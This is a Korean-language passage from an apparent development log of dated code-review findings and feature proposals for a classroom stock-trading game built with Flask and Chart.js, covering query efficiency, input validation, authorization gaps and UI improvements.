- **`member_total_value()` N+1 쿼리 문제** (`app.py:107-118`, `app.py:812-818`): `get_rankings()`에서 RoomMember를 전체 조회 후 멤버 수 N만큼 `member_total_value()`를 개별 호출. 각 호출은 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)` + `Deposit.query.filter_by(...)` 2개의 쿼리 추가 발생. 30명 클래스에서 순위 1회 갱신에 최소 60+30 = 90개 쿼리 실행. `RoomHolding.query.filter_by(room_id=rid).all()`과 `Deposit.query.filter_by(room_id=rid, status='active').all()`을 각각 1번 쿼리해 `user_id` 기준 dict로 group한 뒤 루프를 돌면 3개 쿼리로 동일 결과 산출 가능. `host_members(rid)` (`app.py:542-562`)에도 같은 문제가 있어 양쪽 모두 개선 필요.

- **Chart.js 인스턴스가 주식 상세 모달 재열 때 destroy 되지 않음** (`app.js:1-30 S.stockChart`, `app.js:1372-1400` `loadChart()`): `S.stockChart`는 모달을 처음 열 때 생성되고 닫아도 destroy 되지 않음. 같은 캔버스(`#stock-chart`)에 새 Chart를 생성 시 "Canvas is already in use. Chart with ID X must be destroyed before the canvas with ID stock-chart can be reused" 경고가 콘솔에 반복 출력되며 메모리 누수가 누적됨. `loadChart()` 진입부 또는 `closeModal('modal-stock')` 핸들러에서 `if (S.stockChart) { S.stockChart.destroy(); S.stockChart = null; }` 3줄 추가로 해결.

- **`force_sector_event()` 이전 뉴스를 덮어씀 — 연속 이벤트 불가** (`stock_service.py:262-275`): 섹터 이벤트 발동 시 `self._news`를 새 dict로 통째 교체. 진행자가 "반도체 섹터 +10%"를 발동한 직후 "IT 섹터 -15%"를 연속 발동하면 학생 화면에는 두 번째 뉴스만 보임. `self._news`의 `items` 리스트(`stock_service.py:158, 238, 270`)가 이미 배열 구조이므로 `force_sector_event()`에서 `self._news['items'].append(new_item)` 방식으로 기존 뉴스에 추가하고 최대 5개 유지 로직을 추가하면 됨. 교사가 여러 섹터를 빠르게 조작할 때 학생이 모든 뉴스를 확인 가능.

- **`host_adjust()`에 delta 범위 유효성 검사 없음** (`app.py:587-603`): `delta = float(d.get('delta', 0))`에 범위 제한이 없어 진행자가 실수로 `-9999999999` 같은 값을 입력해도 `m.cash = max(0, m.cash + delta)`로 0까지만 보호됨. 반대로 `+99999999999` 입력 시 참여자 현금이 게임 밸런스를 깨는 수준으로 증가 가능. `if abs(delta) > room.starting_cash * 10: return error` 정도의 가드 또는 UI `adj-delta` 입력 필드에 `max="50000000"` HTML 속성 추가로 실수 방지. 현재 UI에 min/max 속성이 없음 (`index.html:788`).

- **`trade()` 엔드포인트에 동시 요청에 대한 row-level 잠금 없음** (`app.py:724-767`): 현재 `member.cash` 잔액 확인(`app.py:748`) 후 차감(`app.py:750`)까지 다른 요청이 끼어들 수 있는 TOCTOU 취약점 존재. SQLite WAL 모드가 동시 쓰기를 직렬화하므로 실제 충돌은 드물지만 PostgreSQL로 전환 시 동시 매수 2건이 모두 잔액 체크를 통과해 과소비가 발생할 수 있음. SQLAlchemy `with_for_update()`로 `RoomMember` 행을 선점하거나(`RoomMember.query.filter_by(...).with_for_update().first()`), 트랜잭션 격리 수준을 SERIALIZABLE로 설정하는 방어 코드 추가 권장.

---

## 2026-07-20 (2차)

### 추가하면 좋을 기능

- **퀴즈 문항별 정답률 집계 통계** (`app.py:1270-1342`, `_quiz_state`): `submit_quiz()`는 정답 여부와 상금/패널티를 처리하지만 답변 기록을 DB에 남기지 않음(`_quiz_state`는 쿨다운 관리 전용). 진행자가 어떤 개념을 학생들이 어려워하는지 알 수 없어 수업 피드백이 불가. `RoomTransaction`에 `action='QUIZ'`, `symbol=f'Q{q["id"]}'`, `note=f'퀴즈 {"정답" if correct else "오답"}'`을 기록하는 1줄 추가 또는 별도 `QuizAnswer(room_id, user_id, qid, correct, ts)` 모델을 추가하고, `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트에서 문항별 정답률을 집계해 진행자 설정 탭에 표시하면 수업 사후 분석 효율이 대폭 향상됨.

- **`refreshMyRank()` 경량 전용 API 교체** (`app.js:735-752`, `app.py:808-824`): 참여자 게임에서 10초마다 `GET /api/rooms/<rid>/rankings` 전체 보드를 내려받아 `data.find(e => e.is_me)`로 자신 항목 1개만 추출. 30명 게임에서 참여자 N명이 동시에 30개 항목을 받으므로 실제 필요 데이터의 30배를 전송. `GET /api/rooms/<rid>/my-summary`(현금·총자산·순위 3개 필드만 반환, 약 15줄 서버 코드)를 추가하고 `refreshMyRank()`에서 이 경량 API를 호출하면 응답 크기 ~97% 감소. `S.currentPage === 'rankings'`일 때만 풀 랭킹을 별도 호출하면 됨.

- **진행자 시장 탭 종목 카드 클릭 시 가격 추이 차트 확인** (`app.js:314-358`, `loadHostMarket()`): 진행자 `host-stock-grid` 카드에는 현재 가격과 섹터만 표시되고 클릭 이벤트가 없음. 참여자 화면의 `openStockModal()`(`app.js:약 1327`)은 이미 서버 차트 API를 호출해 Chart.js 모달을 표시하므로, `loadHostMarket()`의 `stock-card` 렌더링에 `onclick="openStockModal('${st.symbol}')"` 한 줄 추가로 진행자도 종목 조정 전 가격 흐름 확인 가능. 서버 변경 불필요.

- **게임 설정 프리셋 로컬 저장/불러오기** (`app.js:121-139`, `doCreateRoom()`): 교사가 매 수업마다 게임 시간·시작 자금·금리를 반복 입력. `doCreateRoom()` 상단에 `const saved = JSON.parse(localStorage.getItem('gamePreset') || 'null')`로 이전 설정을 자동 복원하고, 게임 생성 성공 시 `localStorage.setItem('gamePreset', JSON.stringify({dur, cash, rate}))`로 저장하는 약 5줄 추가. "마지막 사용 설정으로 불러오기" 버튼을 함께 제공하면 서버 변경 없이 반복 입력 피로를 완전히 제거 가능.

- **관심 종목 목표 가격 알림 기능** (`app.js:17`, `S.watchlist`): `S.watchlist`는 현재 시장 탭 종목 필터링에만 쓰임. `S.watchlistAlerts = JSON.parse(localStorage.getItem('watchlistAlerts') || '{}')` 딕셔너리에 `{symbol: {above: number, below: number}}` 형태로 목표가를 저장하고, `loadMarket()` 내 주가 갱신 시 `if (alert.below && st.price <= alert.below) toast(...)` 조건(약 8줄)을 추가하면 학생이 포트폴리오·예금 탭에 있을 때도 관심 종목의 목표가 도달을 알림으로 받을 수 있음. 서버 변경 불필요, 클라이언트 전용 구현.

### 제거/단순화할 것들

- **`lobby_members()` 호스트 권한 확인 누락** (`app.py:577-585`): `Room.query.get_or_404(rid)` 이후 `cur_user()` 호출이나 `room.host_id == user.id` 체크 없이 멤버 목록을 반환. `/host/lobby-members` 경로임에도 로그인된 사용자라면 방 ID 추측만으로 임의 방의 참여자 이름을 수집 가능 (정보 노출). `loadPLobbyMembers()`(`app.js:579`)가 참여자 로비에서 동일 엔드포인트를 사용하는 구조이므로, 호스트 전용 버전(`host/lobby-members`)은 `if room.host_id != user.id: return 403`을 추가하고 참여자용은 `/lobby-members`로 경로를 분리하는 방향이 권장됨.

- **`_prev` 기준가가 게임 전체 기간 고정되어 등락률 의미 손실** (`stock_service.py:108-113`, `app.py:664-668`): `_prev` dict가 `_init_prices()`에서 한 번 설정된 후 절대 갱신되지 않음. `get_stocks()` API의 `change`·`change_pct` 계산이 항상 게임 시작가와 비교하므로 2시간 게임에서는 사실상 "누적 등락률"이 되어버림. `_maybe_generate_news()` 내 뉴스 생성 직전에 `for sym in STOCKS: self._prev[sym] = self._prices[sym][1]` 한 줄 추가하면 뉴스 사이클 기준 등락률로 전환되어 "이번 뉴스로 얼마나 올랐나"를 직관적으로 확인 가능.

- **`api.get()`/`api.post()` 네트워크 예외가 uncaught promise rejection으로 전파** (`app.js:29-44`): `r.ok` 확인 로직은 있지만 `fetch()` 자체가 throw하는 경우(와이파이 끊김, DNS 실패)에는 `{error: ...}` 변환이 실행되지 않고 예외가 상위로 전파됨. 호출부(`loadHostMembers()`, `loadMarket()` 등)에 try-catch가 없으므로 네트워크 장애 시 `setInterval` 콜백에서 unhandled rejection이 반복 발생하며 이후 코드가 실행되지 않아 UI가 굳음. `api.get()`/`api.post()` 내부를 `try { ... } catch(e) { return {error: '네트워크 오류'}; }` 로 감싸는 2줄 수정으로 전체 호출부를 방어 가능.

- **참여자 게임 폴링에서 랭킹 API 중복 호출** (`app.js:647-649`): `S.currentPage === 'rankings'`일 때 10초 콜백 마지막에서 `refreshMyRank()`(`GET /rankings`)와 `loadParticipantRankings()`(`GET /rankings`)가 거의 동시에 발행되어 동일 엔드포인트를 2회 연속 호출함. 응답 순서가 어긋나면 이전 데이터로 화면이 덮힐 수 있음. `refreshMyRank()` 호출을 `if (S.currentPage !== 'rankings')` 조건부로 감싸거나, `loadParticipantRankings()` 내부에서 자신의 총자산·순위 표시를 같이 처리해 `refreshMyRank()` 자체를 통합하면 중복 제거와 UI 일관성을 동시에 달성.

- **`create_deposit()` 소수점·미소 금액 유효성 검사 부재** (`app.py:887-891`): `amount = float(request.json.get('amount', 0))`에서 `0.001`원 같은 소수점 금액이나 `1e15`원 같은 비현실적 금액을 막는 검증이 없음. `0 < amount < float('inf')` 체크만 존재해 소액 예금을 무제한 생성할 수 있고 `Deposit` 레코드가 폭발적으로 늘어 `withdraw_deposit()` 루프 부하 증가. `amount = int(round(amount))` + `if amount < 10_000: return jsonify({'error': '최소 예금액은 10,000원입니다.'}), 400` 두 줄 추가로 해결.

- **`withdraw_deposit()` 게임 일시정지(freeze) 중 예금 인출 허용** (`app.py:904-916`): 복권·룰렛 자동 일시정지 기간에 가격이 동결된 상태에서 예금을 인출해 현금을 확보하고 `trade()`가 `active` 상태를 요구해도 이를 우회한 뒤 재개 직후 즉시 무위험 대량 매수가 가능한 구조. `trade()`는 `room.status != 'active'` 체크(`app.py:728`)가 있지만 `withdraw_deposit()`에는 상태 확인이 전혀 없음. `room = Room.query.get_or_404(rid)` 조회 후 `if room.status == 'paused': return jsonify({'error': '게임 일시정지 중에는 예금을 해지할 수 없습니다.'}), 400` 추가로 간단히 차단.

---

---

## 2026-07-21

### 추가하면 좋을 기능

- **게임 시작 전 방 설정 수정 기능** (`app.py:363-390`, `models.py:25-41`): 방 생성 후 `duration_minutes`, `starting_cash`, `deposit_rate`를 변경할 수 있는 엔드포인트가 없음. 로비에서 학생 수가 예상보다 많거나 수업 시간이 줄어들 때 방을 삭제하고 다시 만들어야 함. `PUT /api/rooms/<rid>/settings` 엔드포인트를 추가하고 `room.status == 'waiting'` 조건을 만족할 때만 허용하면 됨(약 15줄). 진행자 로비 화면(`screen-host-lobby`)에 "설정 수정" 링크도 추가 필요.

- **URL 쿼리 파라미터 자동 코드 채우기** (`app.js:196-198`, `static/index.html:319-322`): 호스트 로비 QR의 URL이 `?code=XXXXXX` 형식인데(`app.js:197`), 참여자가 해당 URL로 접속해도 입력 폼의 코드 칸이 자동으로 채워지지 않음. `DOMContentLoaded` 시점에 `new URLSearchParams(location.search).get('code')`로 값을 읽어 `document.getElementById('join-code').value`에 설정하는 약 5줄 추가로, QR 스캔 → 자동 코드 입력 흐름을 완성할 수 있음. 특히 스마트폰 환경에서 수동 코드 입력 실수를 방지.

- **룰렛/복권 설정값 서버 재시작 후 복구** (`app.py:250-251`, `app.py:1245-1246`): `_roulette_config`, `_quiz_settings` 두 dict가 순수 in-memory 저장. Render 무료 티어는 비활성 시 컨테이너를 재시작하므로 교사가 설정한 룰렛 확률·퀴즈 보상/패널티가 소멸됨. `lottery_rounds_done` 컬럼처럼(`app.py:34-40`) `Room` 테이블에 `roulette_config JSON`, `quiz_reward_pct FLOAT`, `quiz_penalty_pct FLOAT` 컬럼을 추가하고, `GET/POST /host/roulette-config`와 `GET/POST /host/quiz-settings` 처리 시 DB에도 반영하면 재시작 후 복구 가능.

- **참여자 개인 자산 내역 차트 서버 측 저장** (`app.js:19`, `app.js:697-711`): `S.assetHistory` 배열이 클라이언트 메모리에만 존재해 탭 새로고침·이탈 시 소멸. 30분 게임에서 10초 폴링 기준 최대 180개 포인트가 누적되지만, 새로고침 직후에는 빈 차트가 표시됨. `GET /api/rooms/<rid>/portfolio` 응답에 `asset_snapshots` 배열(최근 30개, 10분 간격)을 추가하고 서버 측 `member_total_value()` 호출을 스냅샷으로 저장(`AssetSnapshot` 모델)하면 재접속 후 차트 복원이 가능. 30명·30분 게임 기준 최대 540행.

- **진행자 시장 탭 종목 카드에 상세 차트 클릭** (`app.js:314-358`, `loadHostMarket()`): `host-stock-grid` 카드에 클릭 핸들러가 없어 진행자가 가격 강제 조정 전 시세 흐름을 확인할 방법이 없음. 참여자 화면의 `openStockModal(sym)` 함수가 이미 구현되어 있으므로 (`app.js` 내 종목 카드 onclick 부분), `loadHostMarket()`의 카드 렌더링 template literal에 `onclick="openStockModal('${st.symbol}')"` 한 줄 추가만으로 진행자도 동일 차트 모달 활용 가능. 서버 변경 불필요.

- **게임 방 설정 프리셋 localStorage 저장** (`app.js:121-139`): 교사가 매 수업마다 게임 시간·시작 자금·금리를 동일하게 반복 입력. `doCreateRoom()` 성공 시 `localStorage.setItem('gamePreset', JSON.stringify({dur, cash, rate}))` 저장하고, 방 만들기 화면 진입 시 이를 불러와 `value`에 자동 적용하는 약 8줄 추가. "마지막 사용 설정 불러오기" 버튼을 별도로 제공하면 실수로 덮어쓰는 것도 방지 가능.

### 제거/단순화할 것들

- **`종목명 학번 이름` 형식이 서버에서 강제되지 않아 엑셀 분리 오류 발생** (`app.py:1435-1438`, `app.js:73-80`): 엑셀 내보내기에서 `u.username.split(' ', 1)`으로 학번과 이름을 분리하는데, 이름에 공백이 있거나(`홍 길동`) 학번 없이 이름만 입력한 경우 `sid`가 이름 값이 되고 `name`이 빈 문자열이 됨. 서버의 `enter()` API (`app.py:329-342`)가 `len(u) >= 2` 검사만 함. 최소한 `len(u.split()) >= 2` 조건을 추가하거나, 프론트엔드 `doAuth()`(`app.js:73-75`)에서 `sid`와 `name` 값을 따로 검증해 전송하고 서버가 별도 필드로 처리하는 방향으로 리팩터링이 필요.

- **`_ending_soon` 집합 재시작 시 소멸로 인한 60초 재설정 버그** (`app.py:90`, `app.py:527-535`): 진행자가 종료 버튼 클릭 시 `remaining > 60`이면 `end_time = now + 60s`로 갱신하고 `rid`를 `_ending_soon`에 추가. 그러나 Render가 이 60초 사이에 재시작하면 `_ending_soon`이 초기화됨. 재시작 후 `get_room()` 폴링이 되살아난 진행자가 다시 종료 버튼을 누르면 `rid not in _ending_soon`이 True여서 `end_time = now + 60s`가 또 60초 연장됨. `Room` 테이블에 `ending_soon_until DATETIME` 컬럼을 추가하거나, `end_room()` 진입부에서 `room.end_time - now <= 60`이면 즉시 종료하도록 수정 필요.

- **`get_history()` 차트가 게임 중 실제 가격 이력을 반영하지 않음** (`stock_service.py:281-309`): `get_history()`는 현재 가격(`current`)에서 역방향 랜덤 워크로 바를 생성(`stock_service.py:296-305`). 즉 게임 시작 후 강제 섹터 이벤트로 주가를 +30% 올려도 차트 캔들에는 반영이 안 됨. `force_price()`, `force_sector_event()`에서 `self._history_cache`를 삭제하지만(`stock_service.py:227-229`, `stock_service.py:257-259`) 다음 요청에서 또 랜덤 재생성. 최소한 `StockService` 내부에 실제 변동 이력을 `deque(maxlen=60)` 형태로 저장하고 `get_history()`에서 이를 활용하면 차트 신뢰도가 크게 향상됨.

- **`get_quiz()` 일시정지 중에도 문제 발급 가능** (`app.py:1248-1268`): `get_quiz()` 라우트는 `room.status != 'active'` 조건을 검사(`app.py:1252-1253`)하므로 일시정지(paused) 중에는 403 응답을 반환하지 않고 오히려 `return jsonify({'error': '게임 중에만 사용 가능합니다'}), 400`을 반환해 퀴즈 FAB 버튼이 클릭 가능한 채로 남음. 일시정지 상태에서 문제를 발급받아(=실제 400 응답은 나가지만 팝업이 열림) UX가 혼란스러움. `room.status not in ('active',)` 조건으로 명확히 하고, 프론트엔드 `openQuiz()`(`app.js` 내 해당 함수)에서도 `S.room.status !== 'active'` 시 toast('일시정지 중')로 즉시 반환하면 됨.

- **`lobby_members()` 엔드포인트 호스트 인증 누락** (`app.py:577-585`): `/api/rooms/<rid>/host/lobby-members` 경로는 `/host/` 하위에 있지만 `cur_user()`나 `room.host_id` 검사 없이 모든 로그인 사용자에게 방 멤버 목록을 반환. 방 ID를 순차 대입하는 것만으로 다른 수업의 학생 이름·학번 목록 수집이 가능한 개인정보 노출. 참여자 로비에서도 이 엔드포인트를 사용(`app.js:579`)하므로 완전한 호스트 전용화는 불가하나, 최소한 `if room.host_id != user.id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return 403` 체크를 추가해 해당 방 관계자 외 접근을 차단해야 함.

- **`host_members()`에서 `member_total_value()` N+1 쿼리 중복 (호스트 대시보드 전용)** (`app.py:542-562`): 전일 분석에서 `get_rankings()`의 N+1 문제를 지적했으나 `host_members()` 역시 동일 패턴. 10초마다 호스트 순위 탭이 갱신될 때 30명 기준 60~90개 쿼리 발생. `get_rankings()` 개선과 동시에 `host_members()`도 `RoomHolding`·`Deposit`을 `room_id` 기준 일괄 조회 후 메모리 내 집계로 전환하면 순위 API 응답 시간이 SQLite 기준 약 300ms → 30ms로 단축 예상.

---

## 2026-07-21 (2차)

### 추가하면 좋을 기능

- **진행자 방송 공지 기능** (`app.py:278-305`, `room_dict()`, `app.js:1150-1206`): 진행자가 텍스트 메시지를 입력하면 모든 참여자 화면 최상단에 배너로 즉시 표시되는 기능. 현재는 폭탄뉴스 이벤트 외에 교사가 학생 전체에게 직접 텍스트 공지를 보낼 수단이 없음. `POST /api/rooms/<rid>/host/announce` 엔드포인트를 추가해 `Room` 테이블 또는 in-memory dict에 `current_announcement` 문자열을 저장하고, `room_dict()` (`app.py:278`) 응답에 포함시키면 기존 참여자 5초 폴링이 이를 수신해 화면 상단에 `position:fixed` 배너로 표시 가능. "지금 삼성전자 주가 주목!" 같은 수업 유도 지시를 즉시 전달 가능.

- **지정가(예약) 주문 기능** (`app.py:724-767`, `trade()`, `stock_service.py:101-139`): 현재는 시장가 즉시 체결만 지원. "삼성전자 72,000원 이하 시 10주 매수"처럼 조건부 주문을 설정하면 해당 가격 도달 시 서버가 자동 체결하는 기능. `LimitOrder(room_id, user_id, symbol, action, target_price, shares)` 테이블을 추가하고, `get_price()` 호출 주기(`stock_service.py:PRICE_TTL=20`) 때마다 미체결 주문을 스캔해 조건 충족 시 `trade()` 핵심 로직을 실행하면 됨. 실제 증권사 핵심 주문 유형(지정가·시장가 비교)을 직접 체험하게 해 교육적 가치가 높음. 클라이언트는 시장 탭 주식 모달에 "예약 매수/매도" 탭 추가로 구현.

- **진행자 화면 QR 코드 자동 생성** (`app.js:204-217`, `enterHostLobby()`, `static/index.html:114-134`): 현재 호스트 로비 화면에 방 코드(텍스트)와 "QR 코드" 버튼이 있지만 실제 QR 이미지 생성 로직이 없음 (`app.js:209`에 `#host-qr-img`에 대한 언급만 있고 실제 생성 코드 불확인). 순수 JS로 구현된 QR 인코더(CDN 없이 ~2KB 인라인 스크립트)를 `<canvas>` API와 결합하면 외부 의존 없이 QR을 생성 가능. 교사가 프로젝터에 화면을 띄우면 학생들이 스마트폰으로 즉시 스캔해 입장 가능 — 코드 수동 입력 오류를 완전히 제거.

- **모바일 숫자 키보드 최적화** (`static/index.html:424`, `static/index.html:705`): 주식 수량 입력(`<input id="trade-qty" type="number">`, index.html:705)과 예금 금액 입력(`<input id="dep-amount" type="number">`, index.html:424) 모두 `inputmode="numeric"` 속성이 없음. iOS Safari는 `type="number"`에서 소수점과 마이너스 포함 키보드를 표시하는데, 모바일 기기에서 학생이 수량이나 금액을 입력할 때 숫자 전용 키패드(`inputmode="numeric"`)가 표시되면 입력 정확도와 속도가 크게 향상됨. HTML 속성 2개 추가, 서버 변경 불필요.

- **결과 화면에 섹터별 투자 비중 요약 카드** (`app.js:1694-1760`, `loadResults()`, `app.py:808-824`): 현재 결과 화면(`screen-results`)은 순위표·자산·수익률만 표시하고 "어떤 섹터에 집중했는가"는 제공하지 않음. `loadResults()` 에서 `GET /api/rooms/<rid>/portfolio` 응답의 `holdings` 배열을 섹터별로 집계해 작은 도넛 차트나 섹터 비중 바를 결과 화면 하단에 추가하면 "반도체 집중 투자 vs 분산 투자" 전략 비교 수업 토론 소재로 즉시 활용 가능. 서버 변경 불필요, 기존 `port.holdings` 데이터 재활용.

- **퀴즈 오답 시 관련 용어 사전 바로가기** (`app.js:882-889`, `submitQuiz()`, `education_data.py:GLOSSARY`): 퀴즈 오답 결과에 `q['ex']` 한 줄 해설만 표시됨. `QUIZ_QUESTIONS`에 `glossary_key` 필드를 추가해 서버 응답에 포함시키고(`submit_quiz()` `app.py:1342`), `submitQuiz()`의 오답 결과 영역에 "📚 관련 용어 보기" 버튼을 추가해 `openGlossaryModal(data.glossary_key)` 함수를 호출하면, 오답 → 즉시 개념 복습 흐름이 완성됨. 교육 탭을 별도로 열 필요 없이 퀴즈 결과 화면에서 바로 개념 확인 가능.

### 제거/단순화할 것들

- **`minigame_spin()` 룰렛 자금 마련 시 주식 전량 매도 후 `h.shares=0, h.avg_price=0`만 설정하고 DB 레코드 삭제 안 함** (`app.py:1037-1038`): `trade()` (`app.py:762`)는 주식을 전량 매도하면 `db.session.delete(holding)`으로 레코드를 삭제하지만, `minigame_spin()` 내 자금 마련 코드는 `h.shares = 0; h.avg_price = 0`만 설정하고 레코드를 남김. 동일 문제가 `submit_quiz()` 퀴즈 패널티 코드(`app.py:1318`)에도 존재. 0주 레코드가 DB에 잔류하면 `RoomHolding.query.filter_by(room_id=rid, user_id=uid).all()` 쿼리 결과가 오염되고 `get_portfolio()` 루프가 불필요하게 순회해야 함. 두 곳 모두 `h.shares == 0` 이후 `db.session.delete(h)` 호출 패턴으로 통일.

- **`Room.query.get_or_404(rid)` deprecated Legacy Query API를 40곳 이상에서 반복 사용** (`app.py:435, 478, 493, 506, 522, 545, 567 등`): Flask-SQLAlchemy 3.0 이후 `Query.get()`과 `Query.get_or_404()`는 deprecated됨. `grep -n "get_or_404" app.py` 결과 40개 이상의 호출이 확인됨. SQLAlchemy 2.0 스타일인 `db.get_or_404(Room, rid)` 패턴(Flask-SQLAlchemy 3.x 지원)으로 교체해야 향후 의존성 업그레이드 시 하위 호환 경고를 제거 가능. `Room.query.get_or_404(rid)` → `db.get_or_404(Room, rid)`, `db.session.get(Room, rid)` 두 가지 대안 중 404 처리 필요 여부에 따라 선택.

- **`gen_code()` 최종 폴백이 중복 코드를 반환할 수 있어 `create_room()` 500 위험** (`models.py:8-13`, `app.py:382-390`): `gen_code()`는 10번 시도 후 모두 중복이면 마지막으로 생성된 코드를 그냥 반환(`return ''.join(random.choices(...))`). 반환값이 이미 사용 중인 코드이면 `db.session.commit()` 시 `IntegrityError`(UNIQUE 제약 위반)가 발생하는데, `create_room()` (`app.py:382-390`)에는 이 예외를 처리하는 try-except가 없어 500 HTML 에러 반환. 수업 중 방 생성이 실패하는 드문 케이스이지만, `gen_code()` 마지막 줄을 `raise RuntimeError('코드 생성 실패')`로 바꾸거나 `create_room()`에서 `IntegrityError`를 catch해 재시도하는 방어 코드가 필요.

- **`export_rankings()` 게임 진행 중 호출 시 예금 이자 미정산 상태로 내보내기** (`app.py:1419-1440`): `export_rankings()`는 `room.status != 'ended'` 체크 없이 진행자가 언제든 호출 가능. 게임 중 다운로드 시 `member_total_value()`가 활성 예금의 원금만 포함하고 이자는 게임 종료(`_end_room()`) 전까지 정산되지 않음. 결과적으로 엑셀의 최종 자산이 실제 게임 종료 후 순위와 다른 값을 보여줌. 최소한 파일명에 현재 상태(`_진행중_미정산`)를 명시하거나, `room.status != 'ended'`일 때 경고 헤더 행을 시트 상단에 삽입하는 것이 사용자 혼란을 방지할 수 있음. 강하게는 `status='ended'` 조건을 강제해 종료 후에만 다운로드 허용.

- **`minigame_spin()` 예금 인출 시 초과 인출 — `submit_quiz()` 부분 인출과 불일치** (`app.py:1049-1058` vs `app.py:1328-1335`): 룰렛 베팅 자금 마련 중 예금을 인출할 때 `m.cash += d.amount; shortfall -= d.amount; d.status = 'withdrawn'`으로 **예금 전액을 항상 해지**. shortfall이 5만원인데 예금이 100만원이면 100만원 전체가 해지되어 초과 95만원이 현금으로 전환됨. 반면 `submit_quiz()` 패널티 처리(`app.py:1331`)는 `take = min(dep.amount, shortfall); dep.amount -= take`로 부분 인출을 지원. 두 곳이 동일한 자금 마련 시나리오에서 다르게 동작해 학생 불이익 발생 가능. `minigame_spin()`에도 `take = min(d.amount, shortfall)` 패턴을 적용하고 잔여 예금을 유지해야 함.

- **`loadChart()` 기간 탭 활성화가 한국어 텍스트 비교에 의존해 리팩토링 취약** (`app.js:1360-1364`): 기간 탭 버튼의 활성 클래스를 `b.textContent === {'1d':'1일','1w':'1주','1mo':'1달','3mo':'3달','1y':'1년'}[period]` 문자열 매핑으로 결정. 만약 탭 텍스트가 "1개월"로 변경되거나 공백이 추가되면 매핑이 조용히 실패해 어떤 탭도 활성화되지 않음. HTML에 `data-period="1mo"` 속성을 추가하고(`static/index.html:680-684`) `loadChart()` 내에서 `b.dataset.period === period`로 비교하도록 변경하면 텍스트 변경에 독립적인 견고한 구현이 됨. 서버 변경 불필요, 5줄 수정.

- **`withdraw_deposit()` `RoomMember`가 None인 경우 `AttributeError` 잠재** (`app.py:912-914`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 후 None 체크 없이 `m.cash += dep.amount` 실행. 예금 소유자는 반드시 RoomMember여야 하므로 현재는 실패하지 않지만, 향후 게임 중 강퇴 기능 구현 시 강퇴된 학생의 예금 조회 API 호출로 AttributeError → 500 응답 발생 가능. `get_portfolio()` (`app.py:777`) 처럼 `if not m: return jsonify({'error': '참여자가 아닙니다.'}), 403` 방어 코드를 `app.py:913` 직후에 추가해 API 계약을 명확히 해야 함.

---

## 2026-07-22

### 추가하면 좋을 기능

- **참여자 최초 입장 시 게임 사용법 튜토리얼 오버레이** (`app.js:589-651`, `enterParticipantGame()`): 처음 참가하는 학생이 게임 시작 직후 어디서 무엇을 해야 할지 안내가 전혀 없음. `enterParticipantGame()` 내에서 `localStorage.getItem('tutorialSeen_' + S.room.id) === null`인 경우 3단계 오버레이(① 시장 탭에서 종목 클릭 → ② 수량 입력 후 매수 → ③ 순위 탭에서 내 위치 확인)를 표시하고 "시작하기" 버튼으로 닫게 하면 됨. 서버 변경 없이 클라이언트 단 ~30줄로 구현 가능하며, 수업 초반 5분간 "어떻게 해요?"라는 질문을 대폭 줄일 수 있음.

- **진행자 대시보드에 최근 체결 거래 실시간 피드** (`app.py:542-562`, `host_members()`): 진행자 화면에서 학생이 어떤 거래를 하는지 실시간으로 확인할 방법이 없음. `GET /api/rooms/<rid>/host/recent-trades` 엔드포인트를 추가해 `RoomTransaction`의 최근 10건(전체 참여자 대상)을 KST 시각과 함께 반환하고, 진행자 순위 탭 하단에 작은 피드로 표시하면 수업 개입 시점을 포착하는 데 도움이 됨. 기존 10초 호스트 폴링 주기에 묻어가면 서버 부하 추가 없이 구현 가능.

- **진행자가 특정 문항을 방 전체에 일제 발송하는 "방송 퀴즈" 모드** (`app.py:1243-1342`, `_quiz_state`): 현재 퀴즈는 학생이 FAB 버튼을 개별적으로 눌러야 시작됨. `POST /api/rooms/<rid>/host/broadcast-quiz` 엔드포인트에서 `qid`를 지정하면 `_quiz_state`에 방 전체 플래그를 세우고, 참여자 폴링(`GET /api/rooms/<rid>`)이 이를 감지해 자동으로 퀴즈 오버레이를 여는 방식으로 구현 가능. `room_dict()` 응답에 `broadcast_quiz_id` 필드를 추가하고 클라이언트가 변화 감지 시 `openQuiz()` 호출하면 됨. 모든 학생이 동시에 동일 문제를 풀어 채점 결과를 비교하는 수업 참여 활동에 활용 가능.

- **엑셀 다운로드 파일명에 날짜 포함** (`app.py:1485`): `filename = f"{room.name}_결과.xlsx"` 형식으로 방 이름만 사용되어, 같은 반에서 게임을 반복하면 이전 파일이 덮어씌워짐. `datetime.now(KST).strftime('%m%d_%H%M')`을 추가해 `f"{room.name}_결과_0722_1430.xlsx"` 형식으로 변경하는 1줄 수정으로 중복 파일명 문제 완전 해결. 교사가 수업 회차별 결과를 보관할 때 즉시 구분 가능.

- **진행자가 특정 참여자의 포트폴리오 구성 조회** (`app.py:542-562`, `host_members()`): 진행자 대시보드에서 참여자 행의 "거래" 버튼이 거래 내역만 보여주고 현재 보유 종목 구성은 제공하지 않음. `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 엔드포인트를 추가하면(기존 `get_portfolio()` 로직의 권한 조건만 변경) 진행자가 "이 학생은 반도체 집중 투자를 했구나"를 파악하고 맞춤 피드백을 줄 수 있음. 기존 `modal-student-txn` 모달에 "포트폴리오" 탭 하나 추가로 UI도 간단히 통합 가능.

- **복권 수동 시작 모달에 추천 상금 자동 표시** (`app.py:418-419`, `static/index.html:722-736`): 자동 복권(`_auto_start_lottery_if_due`)은 `member_count * 30_000_000` 공식으로 상금을 자동 계산하지만, 진행자가 수동 시작하는 `modal-lottery-start` 입력 폼에는 안내가 없어 임의 금액을 입력하거나 빈칸을 제출하는 실수가 발생. `openManualLotteryModal()` 실행 시 `/host/members` 응답에서 참여자 수를 가져와 `lottery-prize-input.placeholder`에 `추천: ${(count * 30_000_000).toLocaleString()}원` 힌트를 자동 입력하는 ~5줄 추가로 교사의 의사결정 부담 감소.

- **모바일 숫자 입력 필드에 `inputmode="numeric"` 및 `pattern` 속성 추가** (`static/index.html:705, 424, 169, 189`): 주식 수량(`trade-qty`), 예금 금액(`dep-amount`), 주가 강제 변동률(`force-price-pct`), 섹터 이벤트 변동률(`market-event-pct`) 입력란 모두 `type="number"`지만 `inputmode="numeric"` 속성이 없음. iOS Safari는 소수점·마이너스 포함 전체 키보드를 표시해 학생이 숫자 패드를 찾아 전환해야 함. HTML 속성 4개 추가, 서버 변경 불필요, 모바일 입력 UX 즉시 개선.

### 제거/단순화할 것들

